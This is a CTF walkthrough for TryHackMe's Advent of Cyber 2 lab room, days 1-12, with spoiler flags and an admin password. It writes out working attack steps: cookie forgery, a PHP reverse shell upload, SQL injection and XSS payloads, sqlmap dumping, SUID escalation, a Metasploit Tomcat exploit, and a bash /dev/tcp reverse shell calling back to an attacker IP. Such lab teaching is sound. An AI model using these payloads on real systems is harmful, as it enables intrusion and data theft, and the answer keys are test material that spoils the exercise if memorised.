<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Advent_of_Cyber_2_2020_Logo.png" alt="Advent of Cyber 2 2020 Logo">
</p>

# Advent of Cyber 2 [2020]

This guide contains the answer and steps necessary to get to them for the [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2) room.

## Table of contents

- [[Day 1] A Christmas Crisis](#day-1-a-christmas-crisis)
- [[Day 2] The Elf Strikes Back!](#day-2-the-elf-strikes-back)
- [[Day 3] Christmas Chaos](#day-3-christmas-chaos)
- [[Day 4] Santa's watching](#day-4-santas-watching)
- [[Day 5] Someone stole Santa's gift list!](#day-5-someone-stole-santas-gift-list)
- [[Day 6] Be careful with what you wish on a Christmas night](#day-6-be-careful-with-what-you-wish-on-a-christmas-night)
- [[Day 7] The Grinch Really Did Steal Christmas](#day-7-the-grinch-really-did-steal-christmas)
- [[Day 8] What's Under the Christmas Tree?](#day-8=whats-under-the-christmas-tree)
- [[Day 9] Anyone can be Santa!](#day-9-anyone-can-be-santa)
- [[Day 10] Don't be sElfish!](#day-10-dont-be-selfish)
- [[Day 11] The Rogue Gnome](#day-11-the-rogue-gnome)
- [[Day 12] Ready, set, elf.](#day-12-eady-set-elf)
- [[Day 13] ](#day-13-)
- [[Day 14] ](#day-14-)
- [[Day 15] ](#day-15-)
- [[Day 16] ](#day-16-)
- [[Day 17] ](#day-17-)
- [[Day 18] ](#day-18-)
- [[Day 19] ](#day-19-)
- [[Day 20] ](#day-20-)
- [[Day 21] ](#day-21-)
- [[Day 22] ](#day-22-)
- [[Day 23] ](#day-23-)
- [[Day 24] ](#day-24-)

### [Day 1] [A Christmas Crisis](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2001)

In this task we will be using cookies to escalate our account priveleges and restart some Christmas services.

Register for an account, and then login.

1. What is the name of the cookie used for authentication?

After registering for an account, we see we cannot activate any services. So we need to open the developer tools to view our current cookie.

![Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2001/Crisis_Cookie.png)

   ><details><summary>Click for answer</summary>auth</details>

2. In what format is the value of this cookie encoded?

Judging from the characters, this might be hex encoded. Inputting the string in CyberChef, it indeed suggest hexadecimal encoding.

   ><details><summary>Click for answer</summary>Hexadecimal</details>

3. Having decoded the cookie, what format is the data stored in?

   If we use CyberChef to decode the string from `hex` it appears to be a JSON formatted string.
   
   ![Decoded Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2001/Crisis_Cookie_Decoded.png)

   ><details><summary>Click for answer</summary>JSON</details>

Figure out how to bypass the authentication.

4. What is the value of Santa's cookie?

   To log in as Santa, we need to change our cookie value. From the JSON formatted string we can see we need to substitute our username for `santa`. Now can encode this string back to hexadecimal with CyberChef.
   
   ![New Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2001/Crisis_Santa_Cookie.png)

   ><details><summary>Click for answer</summary>7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d</details>

Now that you are the santa user, you can re-activate the assembly line!

5. What is the flag you're given when the line is fully active?

   After replacing our cookie with this new value and reloading the page, we see we can now activate the services. After activating them all, we get the flag.
   
   ![Restored](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2001/Crisis_Restored.png)

   ><details><summary>Click for answer</summary>THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}</details>

### [Day 2] [The Elf Strikes Back!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2002)

In this task, we will try to upload a reverse shell to a server to gain access and read the flag.

ID number: `ODIzODI5MTNiYmYw`

1. What string of text needs adding to the URL to get access to the upload page?

   We need to login with the ID number given. We will use `GET` parameters to send extra information to the browser and the parameter is `id` with value `ODIzODI5MTNiYmYw`.
   
   ![Log In Page](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_Login_Page.png)

   ><details><summary>Click for answer</summary>?id=ODIzODI5MTNiYmYw</details>

2. What type of file is accepted by the site?

   On the next page we can see an upload prompt. Apparently, it will accept images.
   
   ![Logged In](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_Logged_In.png)

   ><details><summary>Click for answer</summary>Image</details>

Bypass the filter and upload a reverse shell.

3. In which directory are the uploaded files stored?

   To bypass the filter, we can use what we learned and try the `.jpg.php` extension. If configured improperly, it will think the file is an image. But first we need to modify our reverse shell which can be copied from `/usr/share/webshells/php-reverse-shell.php`. We need to add our ip address (tun0, since we are connected through a VPN) and a port that is available.
   
   ![PHP Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_PHP_Shell.png)
   
   ![Upload File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_Upload_File.png)
   
   This seems to have worked. To find where the file is located on the server we can use `DirSearch` to enumerate the directories using:
   
   ```cmd
   dirsearch -u 10.10.55.59 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
   ```
   
   ![Dir Search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_Directory.png)
   
   Navigating to `uploads`, we can indeed see the file we just uploaded.
   
   ![File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_File.png)

   ><details><summary>Click for answer</summary>/uploads/</details>

4. What is the flag in /var/www/flag.txt?

   Before continueing we should open a listener with `netcat` on the port we specified in the reverse shell.
   
   ```cmd
   nc -nlvp 1337
   ```
   
   Now we can click on the file on the server and see if we get any incoming connections to our listener.
   
   ![Netcat ssh](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_SSH.png)
   
   Now we can view the flag on the system with `cat /var/www/flag.txt`.
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2002/Elf_Strikes_Flag.png)

   ><details><summary>Click for answer</summary>THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}</details>

### [Day 3] [Christmas Chaos](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2003)

In this task we will be using BurpSuite to brute force the logging on a website with a dictionary.

1. What is the flag?

   After navigating to the login page, we activate the proxy for Firefox. We then supply some arbitrary credentials and hit the login button. Our request is intercepted by BurpSuite and Firefox is waiting.
   
   ![Intercept](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2003/Christmas_Chaos_Intercept.png)
   
   Now we send this request to intruder, select `Cluster bomb` as attack type and select the `username` and `password` values as our positions.
   
   ![Positions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2003/Christmas_Chaos_Positions.png)
   
   Next we need to add all the entries we want to try for both positions in the payload tab.
   
   ![Payloads](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2003/Christmas_Chaos_Payloads.png)
   
   Now we run the attack and wait for the results to come in. The results with a different length or status than the rest would indicate to be a working combination.
   
   ![Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2003/Christmas_Chaos_Credentials.png)
   
   After logging in to the website with the found credentials, we can find the flag as well.
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2003/Christmas_Chaos_Flag.png)

   ><details><summary>Click for answer</summary>THM{885ffab980e049847516f9d8fe99ad1a}</details>

### [Day 4] [Santa's watching](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2004)

In this task we will be using `gobuster` or `dirsearch` to find hidden directories and `wfuzz` to enumerate further to get to the flag.

1. Given the URL "http://shibes.xyz/api.php", what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)

**Note:** For legal reasons, do **not** actually run this command as the site in question has not consented to being fuzzed!

   Looking at the information provided to us in this task we can construct the command needed for `wfuzz`.

   ><details><summary>Click for answer</summary>wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ</details>

2. Use GoBuster (against the target you deployed -- not the shibes.xyz domain) to find the API directory. What file is there?

   Since `Gobuster` wasn't yet installed, I used `DirSearch` instead, but the method shouldn't be to different. Our first command will be used to find any hidden directories.
   
   ```cmd
   dirsearch -u 10.10.205.182 -w /usr/share/wordlists/dirb/big.txt -r
   
   or
   
   gobuster dir -u 10.10.205.182 -w /usr/share/wordlists/dirb/big.txt
   ```
   
   Navigating to this directory we can find the file present.
  
  ![Dir Search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2004/Santa_Watching_Directory.png)

   ><details><summary>Click for answer</summary>site-log.php</details>

3. Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?

   Here, I used the wordlist provided by TryHackMe and `date` as the parameter for the api. This results in the following command:
   
   ```cmd
   wfuzz -c -z file,/usr/share/wordlists/tryhackme/wordlist.txt -u http://10.10.205.182/api/site-log.php/?date=FULL --hw 0
   ```
   
   The `--hw o` argument filters out any responses which are empty. `--hc 404` or similar will probably not work as the api still returns information, it is just empty.
   
   ![Api Results](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2004/Santa_Watching_Api_Parameter.png)
   
   Now we can look for the correct log with the date we found. Either use `curl` to retrieve the information,
   
   ![Curl Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2004/Santa_Watching_Curl.png)
   
   or navigate to the page in the browser.
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2004/Santa_Watching_Flag.png)

   ><details><summary>Click for answer</summary>THM{D4t3_AP1}</details>

### [Day 5] [Someone stole Santa's gift list!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2005)

In this task we will be using SQL injection to bypass the login page and find the information we are after.

Some usefull resources:

- [List of SQL Commands](https://www.codecademy.com/articles/sql-commands)
- [SQLMap Command Snippet Cheat Sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet)
- [SQL Injection Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [Payload Lists](https://github.com/payloadbox/sql-injection-payload-list)
- [SQL Injection Tutorial](https://tryhackme.com/room/sqlibasics)

**Database Type:** sqlite
**Bypass WAF:** `--tamper=space2comment`

1. Without using directory brute forcing, what's Santa's secret login panel?

   To find the hidden page, we can try and combine several terms we find in this task.

   ><details><summary>Click for answer</summary>/santapanel</details>

2. How many entries are there in the gift database?

   Logging into the application can be done by supplying the `' or 1=1;--` command.
   
   ![Log In Page](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_Panel.png)
   
   Here we can use SQLi to get results from the webpage itself by using the following command:
   
   ```cmd
   ' union select 1,2;--
   ```
   
   ![Column Enumeration](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_Column_Numbers.png)
   
   However, for this task we will use `sqlmap` to find more information about the database. First we create a request file for `sqlmap` to use with BurpSuite. Enable the proxy, enter something arbitrary into the search field and click search. Now we intercepted the request in BurpSuite, we can save it as an item in a folder of our choice.
   
   ![Save Item](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_Save_Item.png)
   
   Now we use `sqlmap` to dump all information of the database.
   
   ```cmd
   sqlmap -r database.request --dump-all -batch --tamper=space2comment -dbms sqlite
   
   --dump-all              -> Dump information for the entire database
   -batch                  -> Uses default answers and doesn't prompt the user
   --tamper=space2comment  -> This comes from the note and bypasses the WAF
   -dbms                   -> This specifies the database type, also from our note
   ```
   
   ![Sqlmap Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Command.png)
   
   In the results, we can see the table entries.
   
   ![Sqlmap Table](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Table.png)

   ><details><summary>Click for answer</summary>22</details>

3. What did Paul ask for?

   We can use the results from the previous question to answer this question.

   ><details><summary>Click for answer</summary>Github Ownership</details>

4. What is the flag?

   `sqlmap` also found a hidden table. This seems to contain a flag.
   
   ![Sqlmap Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Flag.png)

   ><details><summary>Click for answer</summary>thmfox{All_I_Want_for_Christmas_Is_You}</details>

5. What is admin's password?

   Another table `sqlmap` found, `users`, contains the credentials for the admin user.
   
   ![Sqlmap Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Credentials.png)

   ><details><summary>Click for answer</summary>EhCNSWzzFP6sc7gB</details>

### [Day 6] [Be careful with what you wish on a Christmas night](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2006)

In this task we will be using XSS exploiting to cause un-intended functioning on the website.

Extra resources:

- [OWASP Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md)
- [Guide about XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [Payload List](https://github.com/payloadbox/xss-payload-list)

1. What vulnerability type was used to exploit the application?

   Since we can use comments to exploit XSS, this type is stored XSS.

   ><details><summary>Click for answer</summary>Stored cross-site scripting</details>

2. What query string can be abused to craft a reflected XSS?

   When looking through the source code for the webpage, we find the name of the comment field as `q`.
   
   ![XSS Field](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2006/Whish_XSS_Field.png)

   ><details><summary>Click for answer</summary>q</details>

3. Run a ZAP (zaproxy) automated scan on the target. How many XSS alerts are in the scan?

   After opening ZAP and entering the url of the website, we can a result for the number of XSS exploits present.
   
   ![OWASP ZAP Exploits](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2006/Whish_XSS_Exploits.png)

   ><details><summary>Click for answer</summary>2</details>

4. Explore the XSS alerts that ZAP has identified, are you able to make an alert appear on the "Make a wish" website?

   For this we can try multiple things. One of them is listed in ZAP and is adding the following command behind the URL of the website:
   
   ```cmd
   /?q=<script>alert('Hello World')</script>
   ```

### [Day 7] [The Grinch Really Did Steal Christmas](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2007)

In this task we will be investigating some network traffic to find some interesting information.

1. Open "pcap1.pcap" in Wireshark. What is the IP address that initiates an ICMP/ping?

   After opening the pcap file in Wireshark we can filter the traffic on the `ICMP` protocol. Here we can see the source ip for the machine initiating the ping.
   
   ![Wireshark ICMP](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_ICMP.png)

   ><details><summary>Click for answer</summary>10.11.3.2</details>

2. If we only wanted to see HTTP GET requests in our "pcap1.pcap" file, what filter would we use?

   We would use `http-request.method` as the filter and `GET` as the value.

   ><details><summary>Click for answer</summary>http.request.method == GET</details>

3. Now apply this filter to "pcap1.pcap" in Wireshark, what is the name of the article that the IP address "10.10.67.199" visited?

   Using the above filter as well as `&& ip.src == 10.10.67.199` we can narrow down the the traffic even more.
   
   ![Wireshark HTTP](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_GET_Article.png)

   ><details><summary>Click for answer</summary>reindeer-of-the-week</details>

4. Let's begin analysing "pcap2.pcap". Look at the captured FTP traffic; what password was leaked during the login process?

   Here we can filter on FTP traffic containing something related to a password. Such as `pass`.
   
   ![Wireshark FTP Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_FTP.png)

   ><details><summary>Click for answer</summary>plaintext_password_fiasco</details>

5. Continuing with our analysis of "pcap2.pcap", what is the name of the protocol that is encrypted?

   If we remove all filters we can see the first entry being an encrypted SSH connection.
   
   ![Wireshark SSH](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_SSH.png)

   ><details><summary>Click for answer</summary>SSH</details>

6. What is on Elf McSkidy's wishlist that will be used to replace Elf McEager?

   To find any files we can filter on any plain text protocols such as `http`, `dns`, or `telnet`. Looks like there might be a list on `http` traffic. Lets save it to our machine.
   
   ![Wireshark HTTP](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_HTTP.png)
   
   Now we can extract the archive and read the file.
   
   ![Wireshark File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_File.png)

   ><details><summary>Click for answer</summary>Rubber ducky</details>

### [Day 8] [What's Under the Christmas Tree?](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2008)

In this task we will be using `nmap` to find more information on the target machine.

1. When was Snort created?

   A quick Google search can give us the answer.

   ><details><summary>Click for answer</summary>1998</details>

2. Using Nmap on 10.10.77.254 , what are the port numbers of the three services running?  (Please provide your answer in ascending order/lowest -> highest, separated by a comma)

   Use the following command to find any running services and some more information:
   
   ```cmd
   sudo nmap -sS -sV 10.10.77.254
   ```
   
   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_1.png)

   ><details><summary>Click for answer</summary>80,2222,3389</details>

3. Use Nmap to determine the name of the Linux distribution that is running, what is reported as the most likely distribution to be running?

   This information can be found on the previous images.

   ><details><summary>Click for answer</summary>ubuntu</details>

4. Use Nmap's Network Scripting Engine (NSE) to retrieve the "HTTP-TITLE" of the webserver. Based on the value returned, what do we think this website might be used for?

   For this we can use the `--script=http-title` argument
   
   ![Nmap Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_Script.png)

   ><details><summary>Click for answer</summary>blog</details>

5. Now use different scripts against the remaining services to discover any further information about them

   The `-A` or `-sC` argument can be used to let nmap execute several default scripts. Doing so gives some more information.
   
   ![Nmap Scipts](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_Scripts.png)


### [Day 9] [Anyone can be Santa!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2009)



1. Name the directory on the FTP server that has data accessible by the "anonymous" user

   To connect to the machine through FTP we can use the following command:
   
   ```cmd
   ftp 10.10.210.253
   ```
   
   Then we can try logging is as user anonymous. Looks like we can indeed log in this way. Using `ls -lh` we can see the available directories.
   
   ![FTP Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_FTP_Directory.png)

   ><details><summary>Click for answer</summary>public</details>

2. What script gets executed within this directory?

   Navigating into this directory we can see two files. One of which is probably the script that gets executed. Lets download it for the next question using: `get backup.sh`.
   
   ![FTP Get](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_FTP_Get.png)

   ><details><summary>Click for answer</summary>backup.sh</details>

3. What movie did Santa have on his Christmas shopping list?

   Using the same command as previously `get shoppinglist.txt` we can download the shopping list and open its content.
   
   ![Santa Movie](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Movie.png)

   ><details><summary>Click for answer</summary>The Polar Express</details>

4. Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!

   First we need to add our malicious payload to the script. From the [Cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) we can add the following to our script to get us a reverse shell. We need to add our IP address (with the VPN in this case) and a port for us to listen on.
   
   ```cmd
   bash -i >& /dev/tcp/10.18.78.136/1337 0>&1
   ```
   
   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Script.png)
   
   Now we can upload the script back to the server with `put backup.sh`. Then we must open up a listener on the correct port and wait for the script to execute on the server.
   
   ```cmd
   nc -nlvp 1337
   ```
   
   ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Reverse_Shell.png)
   
   As soon as we have our shell, we can navigate to the flag and view its contents.
   
   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Flag.png)

   ><details><summary>Click for answer</summary>THM{even_you_can_be_santa}</details>

### [Day 10] [Don't be sElfish!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2010)

In this task we will be exploiting a vulnerability in the Samba file sharing protocol.

1. Using enum4linux, how many users are there on the Samba server (MACHINE_IP)?

   Here we can use `enum4linux` to find out more information about the shares using:
   
   ```cmd
   enum4linux -S -G -U 10.10.111.166
   ```
   
   Under the users section we get a list of the available users on the shares.
   
   ![Samba Users](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_Users.png)

   ><details><summary>Click for answer</summary>3</details>

2. Now how many "shares" are there on the Samba server?

   We can use the results from the previous question to get the shares available. This is located in the Share Enumeration section.
   
   ![Samba Enumeration](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_Enumeration.png)
   
   Another method we can use is via the `smbclient` command with the following arguments:
   
   ```cmd
   smbclient -N -L 10.10.111.166
   ```
   
   Then we get a similar result as with `enum4linux`.

   ><details><summary>Click for answer</summary>4</details>

3. Use smbclient to try to login to the shares on the Samba server (MACHINE_IP). What share doesn't require a password?

   In the session check section we can see the server allows logging in with empty username and password.
   
   ![Samba Session Check](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_Credentials.png)
   
   From the enumeration section it looks like the santa share was accessible without a password.
   
   Using the following command we can try and log in to this share:
   
   ```cmd
   smbclient //10.10.111.166/tbfc-santa
   ```
   
   ![Samba Share](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_Share.png)

   ><details><summary>Click for answer</summary>tbfc-santa</details>

4. Log in to this share, what directory did ElfMcSkidy leave for Santa?

   After enumerating the directory in the previous question we can download the text file and view its contents.
   
   ```cmd
   mget *
   
   or
   
   get note_from_mcskidy.txt
   ```
   
   ![Samba File Get](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_File_Get.png)
   
   After viewing the file, it looks like it is related to the folder found in the same share.
   
   ![Samba File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2010/Selfish_SMB_File.png)

   ><details><summary>Click for answer</summary>jingle-tunes</details>

### [Day 11] [The Rogue Gnome](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2011)

In this task we will be trying to escalate our privileges after first loggin into the machine using the SUID of a binary. [Here](https://gtfobins.github.io/) we can see more about different binaries and how to exploit them.

More information on how to make your reverse shell [interactive](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys). Download LinEnum from [here](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh).

some checklists that can be used as a cheatsheet for the enumeration stage of privilege escalation:

- [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
- [payatu](https://payatu.com/guide-linux-privilege-escalation)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation)

**Machine IP:** `10.10.119.248`
**SSH Username:** `cmnatic`
**SSH Password:** `aoc2020`

1. What type of privilege escalation involves using a user account to execute commands as an administrator?

   The answer to this can be found in todays challenge. Or from Google. Two types of escalation exist.

   ><details><summary>Click for answer</summary>Vertical</details>

2. What is the name of the file that contains a list of users who are a part of the sudo group?

   This can also be found in the challenge description (or from Google). 

   ><details><summary>Click for answer</summary>sudoers</details>

5. What are the contents of the file located at /root/flag.txt?

   After a quick Nmap scan, we can see the ssh service is indeed open op port 22.
   
   ![Rogue Gnome Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2011/Rogue_Gnome_Nmap.png)
   
   So we can ssh into the machine we the supplied credentials with the following command:
   
   ```cmd
   ssh cmnatic@10.10.119.248
   ```
   
   ![Rogue Gnome SSH](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2011/Rogue_Gnome_SSH.png)
   
   After a quick check with `echo $0`, we can see that our shell is already `bash`, so there is no need for us to make it interactive.
   
   ![Gnome Shell Type](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2011/Rogue_Gnome_Shell_Type.png)
   
   As per the instructions we are looking for any binary that has its SUID bit set. So we executed the following command on the machine:
   
   ```cmd
   find / -perm -4000 2>/dev/null
   ```
   
   ![Gnome SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2011/Rogue_Gnome_SUID.png)
   
   Using `GTFOBins` we can find out which of these binaries can be used for privelege escalation. Looks like `bash` is an intersting candidate. Unfortunately, I made some mistakes with the command, so it didn't work for me at first. This threw me of a little and sent me in the wrong direction as I tried to upload the `LinEnum.sh` script to the machine and execute it. This also didn't give anything. But I will list the steps I took as a PoC
   
   [Bash -p command explained](https://stackoverflow.com/questions/63689353/suid-binary-privilege-escalation)
   
   ><details><summary>Click for answer</summary>thm{2fb10afe933296592}</details>

### [Day 12] [Ready, set, elf.](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2012)

In this task we will be using MetaSploit to get access to our target machine.

1. What is the version number of the web server?

   First we need to find the port for the webserver. Using `nmap` didn't yield any result, so it is probably blocked somehow. So we add the `-Pn` argument to assume the host is up.
   
   ```cmd
   nmap -sV 10.10.1.196 -Pn
   ```
   
   [Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Nmap.png)
   
   Navigating to the webserver, we can find the version of the server.
   
   [Server Version](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Server_Version.png)

   ><details><summary>Click for answer</summary>9.0.17</details>

2. What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)

   To find out which CVE we can exploit we can use any of the following sites:
   
   - [Rapid7](http://rapid7.com/)
   - [AttackerKB](https://attackerkb.com/)
   - [MITRE](https://cve.mitre.org/cve/)
   - [Exploit-DB](http://exploit-db.com/)

   Her we can find which CVE we can exploit.
   
   ![CVE Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Exploit_CVE.png)

   ><details><summary>Click for answer</summary>CVE-2019-0232</details>

4. What are the contents of flag1.txt

   To find the flag I tried using the CGI browser exploit mentioned in the challenge. Appending an extra argument to a script located on the server. This mainly works as we know (roughly) what to look for. Assuming the scripts are located in the `/cgi-bin/` directory, we can navigate to the script (if it exists).
   
   ![CGI Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_CGI_Script.png)
   
   Appending the `?&dir` command, we can indeed parse extra information from the server. Apparently, the flag is located in the same folder.
   
   ![CGI Dir](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_CGI_Dir.png)
   
   Maybe we can get the file contents from here directly. After encoding `type flag.txt` in CyberChef, I tried appending this to the URL.
   
   ![Cyber Chef Encode](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_URL_Encode.png)
   
   ![CGI Type](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_CGI_Type.png)
   
   Unfortunately, it didn't seem to work. So I had to try a different method. Enter MetaSploit!
   
   Using the information gathered, we can search MetaSploit for any usefull modules. Open MetaSploit using `msfconsole`. Since we know we are working with an Apache server and cgi vulnerabilities (from the CVE), we can use the following:
   
   ``cmd
   search apache cgi
   ```
   
   ![MSF Search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Search.png)
   
   #2 looks to be what we are looking for. `enableCmdLineArguments` is also mentioned in the CVE. Next we run:
   
   ```cmd
   use exploit/windows/http/tomcat_cgi_cmdLineargs
   ```
   
   Now we need to view our options and set the correct parameters.
   
   ```cmd
   options
   set targeturi /cgi-cin/elfwhacker.bat
   set lhost 10.18.78.136
   set lport 1337
   set rhost 10.10.1.196
   options
   ```
   
   ![MSF Options](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Options.png)
   
   So we can just use `run` to let the exploit start. This gives us a nice session which we can move into with `shell`.
   
